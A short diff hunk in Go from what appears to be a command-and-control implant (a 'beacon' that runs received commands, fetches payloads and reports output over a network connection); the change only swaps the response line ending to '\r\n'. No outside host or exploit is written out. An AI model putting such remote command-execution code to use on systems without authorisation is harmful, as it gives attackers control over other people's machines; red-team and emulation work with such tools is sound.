@@ -52,7 +52,7 @@ func respond(conn net.Conn, beacon Beacon, message string){
 			requestPayload(link.Payload)
 		}
 		response, status, pid := commands.RunCommand(link.Request, link.Executor)
-		link.Response = strings.TrimSpace(response) + "\n"
+		link.Response = strings.TrimSpace(response) + "\r\n"
 		link.Status = status
 		link.Pid = pid
 		beacon.Links = append(beacon.Links, link)
